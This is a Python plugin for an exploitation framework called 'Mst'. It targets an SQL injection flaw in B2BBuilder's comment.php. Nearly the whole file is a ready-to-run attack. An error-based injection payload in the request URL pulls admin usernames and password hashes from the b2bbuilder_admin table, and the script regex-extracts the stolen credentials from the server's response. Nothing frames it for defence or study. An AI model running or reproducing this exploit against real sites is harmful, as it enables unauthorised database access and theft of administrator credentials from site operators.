
# -*- coding: cp936 -*-
'''
Mst=>exploit=>plugin
'''
class mstplugin:
    '''B2BBuilder_sqlInject'''
    infos = [
        ['Plugin','B2BBuilder_comment.php_SQLInject'],
        ['Author','xfkxfk'],
        ['Update','2013/10/25'],
        ['Site','http://www.hackcto.com'],
        ]
    opts  = [
        ['RURL','localhost','Target URL'],
        ['RPATH','/','CMS Path'],
        ['RPORT','80','Target Port'],
        ['PAYLOAD','false','Do Not Need Payload']
        ]
    def exploit(self):
        if  RPORT == '443':
            url = "https://"+RURL+RPATH
        else:
            url = "http://"+RURL+":"+RPORT+RPATH
        get_pass    = '/comment.php?ctype=2&conid=16873%20and(select%201%20from(select%20count(*),concat((select%20(select%20(select%20concat(0x3A,user,0x3A,password,0x3A)%20from%20b2bbuilder_admin%20Order%20by%20user%20limit%200,1)%20)%20from%20`information_schema`.tables%20limit%200,1),floor(rand(0)*2))x%20from%20`information_schema`.tables%20group%20by%20x)a)%20and%201=1'
        url    = url + get_pass

        try:
            color.cprint("[+] Sending exp ..",YELLOW)
            res= fuck.urlget(url).read()
            ok = fuck.find(r':\w+:\w+:',res)[0]
            color.cprint("[*] Exploit Successful !",GREEN)
            color.cprint("[*] %s"%ok,GREEN)           
        except Exception,e:
            color.cprint("[!] Exploit False ! CODE:%s"%e,RED)